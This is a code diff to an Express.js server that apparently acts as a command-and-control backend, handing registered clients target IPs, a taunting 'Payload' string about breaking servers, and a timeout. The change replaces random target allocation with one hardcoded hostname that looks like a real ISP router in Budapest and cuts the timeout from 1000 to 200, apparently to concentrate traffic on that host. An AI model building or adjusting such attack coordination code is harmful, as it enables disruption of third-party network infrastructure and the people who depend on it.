@@ -14,35 +14,41 @@ app.get('/xhr', (_, res) => {
 
 app.post('/update/:uuid', (req, res) => {
   reports[req.params.uuid] = req.body;
-  res.sendStatus(200);
+  res.json({
+    UUID: req.params.uuid,
+    IPs: storage.getValue(req.params.uuid),
+    Payload: "I broke my heart, it's time i broke some servers too :)",
+    Timeout: 200,
+  });
 });
 
 app.get('/renew/:uuid/:ip', async (req, res) => {
-  const orig = storage.getValue(req.params.uuid);
-  const indx = orig.indexOf(req.params.ip);
-  if (indx === -1) {
-    return res.sendStatus(400);
-  }
-  orig.splice(indx, 1);
-  const newip = storage.getNextIp();
-  orig.push(newip);
-  await storage.setValue(req.params.uuid, orig);
-  return res.send(newip);
+  // const orig = storage.getValue(req.params.uuid);
+  // const indx = orig.indexOf(req.params.ip);
+  // if (indx === -1) {
+  //   return res.sendStatus(400);
+  // }
+  // orig.splice(indx, 1);
+  // const newip = storage.getNextIp();
+  // orig.push(newip);
+  // await storage.setValue(req.params.uuid, orig);
+  // return res.send(newip);
+  return res.send("ae-2.xr01.budapest.digicable.hu");
 });
 
 app.post('/register', async (_, res) => {
   const newUUID = v4();
-  const newTargets = [];
-  for (let i = 0; i < 64; i++) {
-    newTargets.push(storage.getNextIp());
-  }
-  await storage.setValue(newUUID, newTargets);
+  const newTargets = ["ae-2.xr01.budapest.digicable.hu"];
+  // for (let i = 0; i < 64; i++) {
+  //   newTargets.push(storage.getNextIp());
+  // }
+  // await storage.setValue(newUUID, newTargets);
   console.log('register: assigned', newTargets[0], '-', newTargets[newTargets.length-1], 'to', newUUID);
   res.json({
     UUID: newUUID,
     IPs: newTargets,
     Payload: "I broke my heart, it's time i broke some servers too :)",
-    Timeout: 1000,
+    Timeout: 200,
   });
 });
 
